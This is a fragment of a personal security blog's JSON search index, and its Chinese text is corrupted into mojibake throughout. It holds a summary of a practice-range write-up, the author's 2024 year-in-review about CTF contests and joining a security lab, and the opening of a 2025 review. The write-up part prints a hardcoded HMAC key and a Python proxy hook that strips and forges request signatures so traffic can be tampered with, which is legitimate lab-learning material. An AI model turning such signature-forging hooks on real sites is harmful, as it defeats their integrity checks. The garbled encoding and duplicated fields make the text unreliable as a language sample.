        "summary": "yakité¶åœº-é«˜çº§å‰ç«¯åŠ è§£å¯†ä¸éªŒç­¾å®æˆ˜ æ„Ÿè°¢kioå¸ˆå‚…æŒ‡è·¯ï¼Œå‘ç°https://vulinbox.bachang.org/#è¿™ä¸ªå®è—é¶åœºï¼Œå½“ç„¶æœ‰yakitä¹Ÿå¯ä»¥åœ¨æœ¬åœ°æ­å»º\nè¿™é‡Œé»˜è®¤è¯»è€…å·²ç»æ‹¥æœ‰jsé€†å‘åŸºç¡€ï¼Œä¸ä¼šç»†è®²ä¸€äº›çŸ¥è¯†ç‚¹äº†ï¼Œæ›´å¤šæ˜¯è¿‡ç¨‹ä½“ç°ï¼Œä»¥åŠå¦‚ä½•é…åˆgalaxyå®ç°è‡ªåŠ¨çš„åŠ è§£å¯†\ngalaxyçš„åŸºç¡€ä½¿ç”¨å¯ä»¥çœ‹æˆ‘è¿™ç¯‡æ–‡ç« ï¼šç½‘ç«™æµé‡åŠ è§£å¯†åœºæ™¯å…¥é—¨\u0026amp;Galaxyä½¿ç”¨\næ–‡ä¸­æˆ‘ç¼–å†™çš„çš„http hookå·²ç»æ‰“åŒ…ä¸Šä¼ è‡³æˆ‘çš„githubï¼šhttps://github.com/Yuy0ung/galaxy_HttpHook_for_yakit-vulinboxï¼Œéœ€è¦å¯ä»¥è‡ªå–\nå‰ç«¯ç­¾åHMAC-SHA256 é¦–å…ˆåˆ†æè¡¨å•æ•°æ®åˆ¤æ–­ï¼Œå‰ç«¯æ˜¯åšäº†ç­¾åçš„ï¼š\nç­¾ååçš„æ•°æ®åŒ…ï¼š jsä¸­å®šä½ä¸€ä¸‹åŠ è§£å¯†ä»£ç å—ï¼š å¾ˆè´´å¿ƒï¼Œæ³¨é‡Šéƒ½å†™å¥½äº†ï¼Œç®€å•åˆ†æä¸€ä¸‹\nfunction outputObj(jsonData) { const word = `username=${jsonData.username}\u0026amp;password=${jsonData.password}`;; return { \u0026#34;signature\u0026#34;: Encrypt(word), \u0026#34;key\u0026#34;: key.toString(), username: jsonData.username, password: jsonData.password, } } ä»è¿™æ®µä»£ç å¯ä»¥åˆ†æå‡ºï¼Œç­¾åæ˜¯å°†æˆ‘ä»¬ä¼ å…¥çš„\tusername=admin\u0026amp;password=123456è¿›è¡Œäº†hmac_sha256åŠ å¯†ï¼Œè€Œå¯†é’¥å°±æ˜¯å°†1234123412341234è½¬16è¿›åˆ¶å³31323334313233343132333431323334\nå€¼å¾—ä¸€æçš„æ˜¯CryptoJS çš„ key åœ¨æ²¡æœ‰æ˜ç¡®æŒ‡å®šç¼–ç æ–¹å¼çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤çš„ toString æ–¹æ³•å°†è¾“å‡ºåå…­è¿›åˆ¶ (Hex) æ ¼å¼çš„å­—ç¬¦ä¸²\nå½“ç„¶CryptoJSè¿˜æœ‰å…¶ä»–å¾ˆå¤šç¼–ç å™¨ï¼Œåœ¨è¿›è¡Œjsåˆ†ææ—¶å€™ï¼Œéœ€è¦æ³¨æ„ç¼–ç æƒ…å†µï¼Œä¸ç„¶ä¼šæµªè´¹å¤§é‡ä¸å¿…è¦çš„æ—¶é—´\næˆ‘ä»¬å¯ä»¥è‡ªè¡ŒåŠ å¯†éªŒè¯ä¸€ä¸‹ï¼š\nç­¾åç¡®å®å’ŒåŠ å¯†åçš„è¡¨å•ä¸€è‡´\né‚£ä¹ˆæ¥ä¸‹æ¥å†™ä¸ªhttp hookï¼š\nimport json import hmac import hashlib import typing as t from fastapi import FastAPI from _base_classes import * SECRET_KEY = b\u0026#34;1234123412341234\u0026#34; # å›ºå®šHMAC keyï¼ˆ16å­—èŠ‚ï¼‰ KEY_STR = SECRET_KEY.hex() # å‘é€åˆ°æœåŠ¡å™¨æ—¶ä½œä¸ºkeyå­—æ®µ app = FastAPI() @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼Œè§£å¯†ï¼Œæ–¹ä¾¿Burpçœ‹åˆ°æ˜æ–‡\u0026#34;\u0026#34;\u0026#34; # è·å–åŸå§‹æ•°æ® content_dict = json.loads(request.content) # ç§»é™¤ç­¾åä¸key content_dict.pop(\u0026#34;signature\u0026#34;, None) content_dict.pop(\u0026#34;key\u0026#34;, None) # è½¬å›å­—èŠ‚æµ request.content = json.dumps(content_dict).encode() return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼ŒåŠ å¯†ï¼ŒåŠ ä¸ŠHMACç­¾å\u0026#34;\u0026#34;\u0026#34; # è§£æåŸå§‹æ•°æ® content_dict = json.loads(request.content) # æ„é€ å¾…ç­¾åå­—ç¬¦ä¸²ï¼ˆå¦‚ username=admin\u0026amp;password=123456ï¼‰ sign_str = \u0026#34;\u0026amp;\u0026#34;.join(f\u0026#34;{k}={v}\u0026#34; for k, v in content_dict.items()) signature = hmac_sha256(sign_str.encode(), SECRET_KEY) # æ„é€ æ–°ç»“æ„ content_dict[\u0026#34;signature\u0026#34;] = signature content_dict[\u0026#34;key\u0026#34;] = KEY_STR request.content = json.dumps(content_dict).encode() return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): \u0026#34;\u0026#34;\u0026#34;Server -\u0026gt; Burpï¼Œä¸æ¶‰åŠè§£å¯†ï¼Œç›´æ¥é€ä¼ \u0026#34;\u0026#34;\u0026#34; return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Clientï¼Œä¸æ¶‰åŠåŠ å¯†ï¼Œç›´æ¥é€ä¼ \u0026#34;\u0026#34;\u0026#34; return response def hmac_sha256(data: bytes, key: bytes) -\u0026gt; str: mac = hmac.new(key, data, hashlib.sha256) return mac.hexdigest() if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) è¿è¡Œhookï¼š\n"
    }
,
    {
        "title": "Yuy0ungçš„2024å¹´åº¦æ€»ç»“",
        "link": "/My-Knowlege-Database/blog/%E6%9D%82%E8%B0%88/yuy0ung%E7%9A%842024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/",
        "content": "è½¬çœ¼å°±2025å¹´äº†ï¼Œæ˜¯æ—¶å€™å›é¡¾ä¸€ä¸‹2024ç©¶ç«Ÿå¹²äº†ä»€ä¹ˆäº†\nå¯’å‡ï¼ˆåˆå…¥D0g3ï¼‰ 2024å¹´åˆï¼Œç»è¿‡å±‚å±‚é¢è¯•ï¼Œç»ˆäºå¦‚æ„¿ä»¥å¿åŠ å…¥äº†é“æ ¼å®‰å…¨ç ”ç©¶å®éªŒå®¤ï¼Œå›æƒ³å½“æ—¶è¿˜æ˜¯ä¸€ä¸ªåªä¼štop10ã€èƒ½æ‰“æ‰“CTFçš„å­©å­ï¼Œä½†æ˜¯åœ¨åŠ å…¥äº†è¿™ä¸ªå®éªŒå®¤ä¹‹åï¼Œæˆ‘çš„WEBä¹‹è·¯ä¹Ÿç®—æ˜¯æ­¥å…¥äº†æ­£è½¨ï¼Œå¯’å‡ç‹ ç‹ çš„åˆ·äº†ä¸€æ³¢CTFSHOWã€å’Œå®éªŒå®¤çš„å¸ˆå‚…ä»¬ä¸€èµ·å¼€å‘¨ä¼šäº¤æµæŠ€æœ¯ã€è¿˜å’Œå¸ˆå‚…ä»¬ä¸€èµ·æ‰“æ¯”èµ›ï¼ˆè¿˜è®°å¾—å½“æ—¶æœ‰beginCTFå’ŒHgameä¸¤åœºä¸ªäººèµ›ğŸ˜ï¼‰ï¼Œæ„Ÿè§‰æ¯ä¸€å¤©éƒ½æœ‰çŸ¥è¯†è¿›å…¥è„‘å­ï¼Œéå¸¸å……å®\nç¿»äº†ç¿»ç›¸å†Œï¼Œå‘ç°è¿˜æœ‰é‚£æ®µæ—¶é—´çš„ç…§ç‰‡ï¼š\nD0g3ä¸‰é¢æ—¶å€™çš„æ‹›æ–°èµ›ï¼ŒçŸ­æš‚çš„ç¬¬ä¸€ï¼ˆç»“æŸçš„æ—¶å€™ä¸‹é¢é‚£ä½å«â€œçº¦æŸé›†â€çš„reå¸ˆå‚…è¶…è¿‡äº†ï¼‰ï¼š\nå¯’å‡å¿™é‡Œå·é—²ï¼Œæ‘¸é±¼ç”»ç”»ï¼š\né‚£æ®µæ—¶é—´æ­çš„åšå®¢ï¼ˆäºŒæ¬¡å…ƒshow show wayï¼‰ï¼š\næ‰“Hgameçš„week2ï¼ŒRCEçš„é¢˜è¢«æˆ‘å½“æˆSSTIäº†ï¼š\nå¤§ä¸€ä¸‹ï¼ˆæ¸å…¥ä½³å¢ƒï¼‰ å¼€å­¦ä¹‹åï¼Œå­¦é•¿ä»¬åˆå¯¹æˆ‘ä»¬çš„æŠ€æœ¯è¿›è¡Œäº†è€ƒæ ¸ï¼Œé¢å¯¹é¢æ‹·æ‰“äº†æˆ‘ä»¬ä¸€é¡¿ï¼Œä¹Ÿç®—æ˜¯è®¤è¯†åˆ°è‡ªå·±çš„ä¸è¶³äº†ï¼Œäºæ˜¯ç»§ç»­ä¸åœçš„å­¦ä¹ ï¼Œè·å–çŸ¥è¯†çš„é€”å¾„æˆ‘ä¹Ÿæ˜¯è¶Šæ¥è¶Šå¤šï¼Œè¿™æœŸé—´å½“ç„¶ä¹Ÿå°‘ä¸äº†ç†¬å¤œå­¦ä¹ ï¼š\nè¿™æ®µæ—¶é—´çš„çŠ¶æ€ä¹Ÿæ˜¯æå¥½ï¼Œæ—©æ—©çš„æ¥åˆ°å®éªŒå®¤ï¼Œä¸€åå°±æ˜¯ä¸€å¤©ï¼Œæ™šä¸Š11ç‚¹æ‰èµ°ï¼Œå®éªŒå®¤è¿˜é…äº†ä¸€å¼ åºŠï¼Œä¸­åˆå›°äº†åºŠä¸Šä¸€èººå°±ç¡ï¼Œéå¸¸æƒ¬æ„\nç„¶ååˆæ˜¯å„ç§æ¯”èµ›ï¼Œå°è±¡æœ€æ·±çš„å°±æ˜¯XYCTFäº†ï¼Œmiscçš„ç¤¾å·¥è¢«æˆ‘æ‹¿äº†ä¸€è¡€ï¼Œå›¢é˜Ÿæœ€ç»ˆæ’åå®šæ ¼åœ¨ç¬¬9åï¼Œè·å¾—äº†å®˜æ–¹é€çš„è´´çº¸ï¼ˆæœ€æˆåŠŸçš„ä¸€é›†ï¼‰\nå…ˆçŸ¥æ²™é¾™æˆéƒ½ç«™å¼€åœ¨æˆ‘ä»¬å­¦æ ¡ï¼š\næˆ‘çš„å¸…æ°”ç­¾åï¼š\nå…ˆçŸ¥æœ‰ä¸€ä¸ªè¯¾é¢˜æ˜¯æœ‰å…³ADDSæ¸—é€ä¸­çš„é˜²å¾¡è§„é¿ï¼Œå½“æ—¶è¿˜æ²¡æœ‰å¼€å§‹å­¦ä¹ åŸŸæ¸—é€å¬ä¸å¤ªæ‡‚ï¼Œä½†å…´è¶£è›®å¤§ï¼Œäºæ˜¯è¿™æ®µæ—¶é—´å°±å¼€å§‹å…¥é—¨åæ¸—é€çš„å„ç§çŸ¥è¯†äº†ï¼Œå¯¹æƒé™æå‡å°¤å…¶æ„Ÿå…´è¶£\nç„¶åä¹˜ç€å­¦æ ¡æ”¾å‡ï¼Œæºœåˆ°é•¿æ²™å»ç©äº†ï¼Œçœ‹æˆ‘åœ¨æœç”«æ±Ÿé˜çš„å¸…ç…§ï¼ˆå¯¹é¢å°±æ˜¯æ©˜å­æ´²ï¼‰ï¼š\nä½†æ˜¯å»é•¿æ²™è€½è¯¯äº†ISCCï¼Œå¸ˆå‚…ä»¬éƒ½æ‹¿äº†1ç­‰å¥–ï¼Œå°±æˆ‘æ‹¿çš„ä¸‰ç­‰å¥–QAQ\nå›æ¥ä¹‹åç»§ç»­æ£é¼“æŠ€æœ¯ï¼Œä¸­é€”æœåŠ¡å™¨è¿‡æœŸäº†ï¼Œç”¨åšå®¢å›­é‡æ–°æ­äº†ä¸ªåšå®¢ï¼š\nç„¶åå°±æ˜¯è“æ¡¥æ¯ï¼Œäººç”Ÿç¬¬ä¸€æ¬¡çº¿ä¸‹CTFï¼ˆè™½ç„¶æ²¡æœ‰å«é‡‘é‡ï¼Œå‚èµ›è¿˜å¾—äº¤é’±ï¼Œå¹¸å¥½å­¦æ ¡æŠ¥é”€ï¼‰ï¼š\nåœ¨æ­¤ä¹‹åï¼Œåšå‡ºäº†ä¸€ä¸ªå¾ˆæ­£ç¡®çš„é€‰æ‹©ï¼ŒåŠ å…¥å±±æµ·å…³å®‰å…¨å›¢é˜Ÿï¼Œå’Œé‡Œé¢çš„å¸ˆå‚…å…±åŒè¿›æ­¥ï¼\næš‘å‡ï¼ˆç»§ç»­æ²‰æ·€ï¼‰ ç®—æ˜¯æ­£å¼å­¦ä¹ æ¸—é€äº†ï¼Œåˆ·æ‰äº†DC1-9å’Œçº¢æ—¥1-5çš„é¶æœºï¼Œæ‘¸æ¸…äº†åæ¸—é€åŸºæœ¬æµç¨‹ï¼Œå®Œäº‹å¼€å§‹ç³»ç»Ÿå­¦ä¹ ä¸ªæµç¨‹çš„æ‰‹æ³•å’Œå§¿åŠ¿ï¼ŒæœŸé—´ä¹Ÿæ˜¯è®¤è¯†äº†ä¸€äº›å¾ˆå¼ºçš„ä½¬ï¼Œæœ‰ä»–ä»¬ç›‘ç£ã€æŒ‡ç‚¹çœŸçš„éå¸¸å¼€å¿ƒ\næš‘å‡æœ€å¥½ç©çš„äº‹æƒ…å°±æ˜¯å»ä¸Šæµ·å‚åŠ å…¨çƒå¼€æºæå®¢å˜‰å¹´åäº†ï¼Œè§è¯†äº†å¤§åŸå¸‚çš„ç¹åï¼Œä¹Ÿæ”¶è·äº†å¾ˆå¤šï¼š\næˆ‘çš„å…¥ä¼šç‰Œï¼š\nç°åœºé€çš„å‘¨è¾¹ï¼š\néå¸¸niceçš„æ°›å›´ï¼š\nå’ŒåŒè¡Œå¸ˆå‚…é€›ä¸Šæµ·ï¼Œä»–å¤ªé«˜äº†190QAQï¼š\nåªèƒ½è¯´éå¸¸æœ‰æ„ä¹‰çš„æš‘å‡ï¼Œè§åˆ°å¾ˆå¤šï¼Œå­¦åˆ°å¾ˆå¤šğŸ‘\nå¤§äºŒä¸Šï¼ˆå´­éœ²å¤´è§’?ï¼‰ æ­£å¼æˆä¸ºä¸€åå­¦é•¿ï¼Œé™¤äº†è‡ªå·±éœ€è¦åšæŒå­¦ä¹ ï¼Œè¿˜éœ€è¦ç›‘ç£å’ŒæŒ‡å¯¼å°ç™»ä»¬å­¦ä¹ ï¼Œå˜æˆäº†å­¦å¼Ÿå­¦å¦¹å£ä¸­çš„Yå¸ˆå‚…ğŸ¤­\nè¦è¯´æŠ€æœ¯ï¼Œå°±æ˜¯ä¸­è§„ä¸­çŸ©ç¨³å®šè¿›æ­¥ï¼Œå€’æ˜¯çº¿ä¸‹æ¯”èµ›åˆæ‰“äº†ä¿©ï¼š\né¦–å…ˆå°±æ˜¯å››å·çœèµ›â€å®‰æ’æ¯â€œï¼š\nå“¥çš„å‚èµ›ç‰Œï¼š\nä¸­è§„ä¸­çŸ©ï¼Œ16åäºŒç­‰å¥–ï¼š\nç„¶åå’Œå±±æµ·å…³çš„å¸ˆå‚…ä¸€èµ·å»å—äº¬å‚åŠ ç¬¬ä¸ƒå±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ›ï¼š\nç´«é‡‘å±±å®éªŒå®¤çœŸçš„å¾ˆé«˜çº§ï¼š\næˆ˜é˜Ÿä»‹ç»æ€ä¹ˆè¿˜æŠŠæˆ‘ä»¬ç…§ç‰‡æŒ‚ä¸Šå»äº†QAQï¼š\nä¸­è§„ä¸­çŸ©ï¼Œæ‹¿ä¸‹æ‹¿ä¸‹ï¼š\né€›é€›å—äº¬ï¼Œç„æ­¦æ¹–çš„é£å¾ˆå¤§\nå¤œæ³Šç§¦æ·®åŸæ¥æ˜¯è¿™æ ·ï¼š\nå®Œäº‹é©¬ä¸Šæ‰¿åŠå›½åŸæ¯ï¼Œå†³èµ›å¹³å°çš„å‰ç«¯ç¼–å†™è¿˜å§”ä»»ç»™æˆ‘äº†ï¼ˆç¬¬ä¸€æ¬¡å†™ï¼Œä¸‘æ˜¯ä¸‘äº†ç‚¹ï¼‰ï¼š\nè¿™å°±å®Œäº†ï¼Ÿ\næˆ‘å½“ç„¶ä¸å¯èƒ½åªä¼šç½‘å®‰å•Šè€å¼Ÿ\næˆ‘çš„ç±³èŠ¾ä¸æ˜¯ç™½ç»ƒçš„ï¼š\næŠ•ç¨¿å¸‚ä¸´å¸–å±•ï¼š\næˆåŠŸå…¥å±•ï¼š\nä½ è¯´æˆ‘ç®—ä¸ç®—åŠä¸ªä¹¦æ³•å®¶äº†ï¼Ÿ\næ€»ç»“ ä¹Ÿç®—æ˜¯å¾ˆå……å®çš„è¿‡å®Œäº†æ•´ä¸ª2024ï¼ŒæˆåŠŸå•èº«æŒºè¿‡18å²äº†ï¼ˆæˆ‘æ˜¯å¾ˆç¼ºå°‘é­…åŠ›å—QAQï¼‰ï¼Œè¿™æœŸé—´çš„å®‰å…¨ã€ä¹¦æ³•ã€ç»˜ç”»ã€é­”æœ¯éƒ½æœ‰æ‰€ç²¾è¿›ï¼Œæ–°çš„ä¸€å¹´ï¼Œäº‰å–ç»§ç»­ä¿æŒï¼Œæ–°æ„¿æœ›å°±æ˜¯æ‰¾ä¸€ä»½ä¸é”™çš„å®ä¹ å“ˆå“ˆå“ˆ\n",
        "summary": "è½¬çœ¼å°±2025å¹´äº†ï¼Œæ˜¯æ—¶å€™å›é¡¾ä¸€ä¸‹2024ç©¶ç«Ÿå¹²äº†ä»€ä¹ˆäº†\nå¯’å‡ï¼ˆåˆå…¥D0g3ï¼‰ 2024å¹´åˆï¼Œç»è¿‡å±‚å±‚é¢è¯•ï¼Œç»ˆäºå¦‚æ„¿ä»¥å¿åŠ å…¥äº†é“æ ¼å®‰å…¨ç ”ç©¶å®éªŒå®¤ï¼Œå›æƒ³å½“æ—¶è¿˜æ˜¯ä¸€ä¸ªåªä¼štop10ã€èƒ½æ‰“æ‰“CTFçš„å­©å­ï¼Œä½†æ˜¯åœ¨åŠ å…¥äº†è¿™ä¸ªå®éªŒå®¤ä¹‹åï¼Œæˆ‘çš„WEBä¹‹è·¯ä¹Ÿç®—æ˜¯æ­¥å…¥äº†æ­£è½¨ï¼Œå¯’å‡ç‹ ç‹ çš„åˆ·äº†ä¸€æ³¢CTFSHOWã€å’Œå®éªŒå®¤çš„å¸ˆå‚…ä»¬ä¸€èµ·å¼€å‘¨ä¼šäº¤æµæŠ€æœ¯ã€è¿˜å’Œå¸ˆå‚…ä»¬ä¸€èµ·æ‰“æ¯”èµ›ï¼ˆè¿˜è®°å¾—å½“æ—¶æœ‰beginCTFå’ŒHgameä¸¤åœºä¸ªäººèµ›ğŸ˜ï¼‰ï¼Œæ„Ÿè§‰æ¯ä¸€å¤©éƒ½æœ‰çŸ¥è¯†è¿›å…¥è„‘å­ï¼Œéå¸¸å……å®\nç¿»äº†ç¿»ç›¸å†Œï¼Œå‘ç°è¿˜æœ‰é‚£æ®µæ—¶é—´çš„ç…§ç‰‡ï¼š\nD0g3ä¸‰é¢æ—¶å€™çš„æ‹›æ–°èµ›ï¼ŒçŸ­æš‚çš„ç¬¬ä¸€ï¼ˆç»“æŸçš„æ—¶å€™ä¸‹é¢é‚£ä½å«â€œçº¦æŸé›†â€çš„reå¸ˆå‚…è¶…è¿‡äº†ï¼‰ï¼š\nå¯’å‡å¿™é‡Œå·é—²ï¼Œæ‘¸é±¼ç”»ç”»ï¼š\né‚£æ®µæ—¶é—´æ­çš„åšå®¢ï¼ˆäºŒæ¬¡å…ƒshow show wayï¼‰ï¼š\næ‰“Hgameçš„week2ï¼ŒRCEçš„é¢˜è¢«æˆ‘å½“æˆSSTIäº†ï¼š\nå¤§ä¸€ä¸‹ï¼ˆæ¸å…¥ä½³å¢ƒï¼‰ å¼€å­¦ä¹‹åï¼Œå­¦é•¿ä»¬åˆå¯¹æˆ‘ä»¬çš„æŠ€æœ¯è¿›è¡Œäº†è€ƒæ ¸ï¼Œé¢å¯¹é¢æ‹·æ‰“äº†æˆ‘ä»¬ä¸€é¡¿ï¼Œä¹Ÿç®—æ˜¯è®¤è¯†åˆ°è‡ªå·±çš„ä¸è¶³äº†ï¼Œäºæ˜¯ç»§ç»­ä¸åœçš„å­¦ä¹ ï¼Œè·å–çŸ¥è¯†çš„é€”å¾„æˆ‘ä¹Ÿæ˜¯è¶Šæ¥è¶Šå¤šï¼Œè¿™æœŸé—´å½“ç„¶ä¹Ÿå°‘ä¸äº†ç†¬å¤œå­¦ä¹ ï¼š\nè¿™æ®µæ—¶é—´çš„çŠ¶æ€ä¹Ÿæ˜¯æå¥½ï¼Œæ—©æ—©çš„æ¥åˆ°å®éªŒå®¤ï¼Œä¸€åå°±æ˜¯ä¸€å¤©ï¼Œæ™šä¸Š11ç‚¹æ‰èµ°ï¼Œå®éªŒå®¤è¿˜é…äº†ä¸€å¼ åºŠï¼Œä¸­åˆå›°äº†åºŠä¸Šä¸€èººå°±ç¡ï¼Œéå¸¸æƒ¬æ„\nç„¶ååˆæ˜¯å„ç§æ¯”èµ›ï¼Œå°è±¡æœ€æ·±çš„å°±æ˜¯XYCTFäº†ï¼Œmiscçš„ç¤¾å·¥è¢«æˆ‘æ‹¿äº†ä¸€è¡€ï¼Œå›¢é˜Ÿæœ€ç»ˆæ’åå®šæ ¼åœ¨ç¬¬9åï¼Œè·å¾—äº†å®˜æ–¹é€çš„è´´çº¸ï¼ˆæœ€æˆåŠŸçš„ä¸€é›†ï¼‰\nå…ˆçŸ¥æ²™é¾™æˆéƒ½ç«™å¼€åœ¨æˆ‘ä»¬å­¦æ ¡ï¼š\næˆ‘çš„å¸…æ°”ç­¾åï¼š\nå…ˆçŸ¥æœ‰ä¸€ä¸ªè¯¾é¢˜æ˜¯æœ‰å…³ADDSæ¸—é€ä¸­çš„é˜²å¾¡è§„é¿ï¼Œå½“æ—¶è¿˜æ²¡æœ‰å¼€å§‹å­¦ä¹ åŸŸæ¸—é€å¬ä¸å¤ªæ‡‚ï¼Œä½†å…´è¶£è›®å¤§ï¼Œäºæ˜¯è¿™æ®µæ—¶é—´å°±å¼€å§‹å…¥é—¨åæ¸—é€çš„å„ç§çŸ¥è¯†äº†ï¼Œå¯¹æƒé™æå‡å°¤å…¶æ„Ÿå…´è¶£\nç„¶åä¹˜ç€å­¦æ ¡æ”¾å‡ï¼Œæºœåˆ°é•¿æ²™å»ç©äº†ï¼Œçœ‹æˆ‘åœ¨æœç”«æ±Ÿé˜çš„å¸…ç…§ï¼ˆå¯¹é¢å°±æ˜¯æ©˜å­æ´²ï¼‰ï¼š\nä½†æ˜¯å»é•¿æ²™è€½è¯¯äº†ISCCï¼Œå¸ˆå‚…ä»¬éƒ½æ‹¿äº†1ç­‰å¥–ï¼Œå°±æˆ‘æ‹¿çš„ä¸‰ç­‰å¥–QAQ\nå›æ¥ä¹‹åç»§ç»­æ£é¼“æŠ€æœ¯ï¼Œä¸­é€”æœåŠ¡å™¨è¿‡æœŸäº†ï¼Œç”¨åšå®¢å›­é‡æ–°æ­äº†ä¸ªåšå®¢ï¼š\nç„¶åå°±æ˜¯è“æ¡¥æ¯ï¼Œäººç”Ÿç¬¬ä¸€æ¬¡çº¿ä¸‹CTFï¼ˆè™½ç„¶æ²¡æœ‰å«é‡‘é‡ï¼Œå‚èµ›è¿˜å¾—äº¤é’±ï¼Œå¹¸å¥½å­¦æ ¡æŠ¥é”€ï¼‰ï¼š\nåœ¨æ­¤ä¹‹åï¼Œåšå‡ºäº†ä¸€ä¸ªå¾ˆæ­£ç¡®çš„é€‰æ‹©ï¼ŒåŠ å…¥å±±æµ·å…³å®‰å…¨å›¢é˜Ÿï¼Œå’Œé‡Œé¢çš„å¸ˆå‚…å…±åŒè¿›æ­¥ï¼\næš‘å‡ï¼ˆç»§ç»­æ²‰æ·€ï¼‰ ç®—æ˜¯æ­£å¼å­¦ä¹ æ¸—é€äº†ï¼Œåˆ·æ‰äº†DC1-9å’Œçº¢æ—¥1-5çš„é¶æœºï¼Œæ‘¸æ¸…äº†åæ¸—é€åŸºæœ¬æµç¨‹ï¼Œå®Œäº‹å¼€å§‹ç³»ç»Ÿå­¦ä¹ ä¸ªæµç¨‹çš„æ‰‹æ³•å’Œå§¿åŠ¿ï¼ŒæœŸé—´ä¹Ÿæ˜¯è®¤è¯†äº†ä¸€äº›å¾ˆå¼ºçš„ä½¬ï¼Œæœ‰ä»–ä»¬ç›‘ç£ã€æŒ‡ç‚¹çœŸçš„éå¸¸å¼€å¿ƒ\næš‘å‡æœ€å¥½ç©çš„äº‹æƒ…å°±æ˜¯å»ä¸Šæµ·å‚åŠ å…¨çƒå¼€æºæå®¢å˜‰å¹´åäº†ï¼Œè§è¯†äº†å¤§åŸå¸‚çš„ç¹åï¼Œä¹Ÿæ”¶è·äº†å¾ˆå¤šï¼š\næˆ‘çš„å…¥ä¼šç‰Œï¼š\nç°åœºé€çš„å‘¨è¾¹ï¼š\néå¸¸niceçš„æ°›å›´ï¼š\nå’ŒåŒè¡Œå¸ˆå‚…é€›ä¸Šæµ·ï¼Œä»–å¤ªé«˜äº†190QAQï¼š\nåªèƒ½è¯´éå¸¸æœ‰æ„ä¹‰çš„æš‘å‡ï¼Œè§åˆ°å¾ˆå¤šï¼Œå­¦åˆ°å¾ˆå¤šğŸ‘\nå¤§äºŒä¸Šï¼ˆå´­éœ²å¤´è§’?ï¼‰ æ­£å¼æˆä¸ºä¸€åå­¦é•¿ï¼Œé™¤äº†è‡ªå·±éœ€è¦åšæŒå­¦ä¹ ï¼Œè¿˜éœ€è¦ç›‘ç£å’ŒæŒ‡å¯¼å°ç™»ä»¬å­¦ä¹ ï¼Œå˜æˆäº†å­¦å¼Ÿå­¦å¦¹å£ä¸­çš„Yå¸ˆå‚…ğŸ¤­\nè¦è¯´æŠ€æœ¯ï¼Œå°±æ˜¯ä¸­è§„ä¸­çŸ©ç¨³å®šè¿›æ­¥ï¼Œå€’æ˜¯çº¿ä¸‹æ¯”èµ›åˆæ‰“äº†ä¿©ï¼š\né¦–å…ˆå°±æ˜¯å››å·çœèµ›â€å®‰æ’æ¯â€œï¼š\nå“¥çš„å‚èµ›ç‰Œï¼š\nä¸­è§„ä¸­çŸ©ï¼Œ16åäºŒç­‰å¥–ï¼š\nç„¶åå’Œå±±æµ·å…³çš„å¸ˆå‚…ä¸€èµ·å»å—äº¬å‚åŠ ç¬¬ä¸ƒå±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ›ï¼š\nç´«é‡‘å±±å®éªŒå®¤çœŸçš„å¾ˆé«˜çº§ï¼š\næˆ˜é˜Ÿä»‹ç»æ€ä¹ˆè¿˜æŠŠæˆ‘ä»¬ç…§ç‰‡æŒ‚ä¸Šå»äº†QAQï¼š\nä¸­è§„ä¸­çŸ©ï¼Œæ‹¿ä¸‹æ‹¿ä¸‹ï¼š\né€›é€›å—äº¬ï¼Œç„æ­¦æ¹–çš„é£å¾ˆå¤§\n"
    }
,
    {
        "title": "Yuy0ungçš„2025å¹´åº¦æ€»ç»“",
        "link": "/My-Knowlege-Database/blog/%E6%9D%82%E8%B0%88/yuy0ung%E7%9A%842025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/",
        "content": "Yuy0ungçš„2025å¹´åº¦æ€»ç»“ â€œå“€å¾ç”Ÿä¹‹é¡»è‡¾ï¼Œç¾¡é•¿æ±Ÿä¹‹æ— ç©·ã€‚â€\nçªç„¶å°±å¹´åº•äº†ï¼Œä¸Šæ¬¡å†™å¹´åº¦æ€»ç»“æ„Ÿè§‰è¿˜æ˜¯åœ¨æ˜¨å¤©ï¼Œæ„Ÿæ…¨ä¸‡åˆ†\n20å²çš„æˆ‘ï¼Œèƒ½å¤Ÿå¾ˆæ¸…æ™°çš„æ„Ÿè§‰åˆ°è‡ªå·±çš„é’æ˜¥æ­£åœ¨æ…¢æ…¢æµé€ï¼Œæ²¡æœ‰äº†å¯¹æ¢¦æƒ³çš„æ¿€æƒ…ï¼Œä¹Ÿæ²¡æœ‰äº†å¾ˆå¤šå¤´å‘ï¼Œæˆ–è®¸åœ¨å˜å¼ºçš„è·¯ä¸Šæ€»éœ€è¦å¤±å»äº›ä»€ä¹ˆ\nç°åœ¨çš„æˆ‘ä¸ç®—æˆåŠŸï¼Œè¿˜æ˜¯æ²¡æœ‰ç¨³å®šçš„å·¥ä½œï¼Œæ²¡æœ‰è¶³å¤Ÿçš„è´¢å¯Œï¼Œä¹Ÿæ²¡æœ‰å€¾è¯‰çš„å¯¹è±¡ï¼Œä¸è¿‡æˆ‘å‘å‰èµ°çš„è·¯é€”æ˜¯æœ‰è¶£çš„ï¼Œå¯ä»¥å‘ä½ åˆ†äº«ä¸€äºŒ\nçº¿ä¸‹èµ› 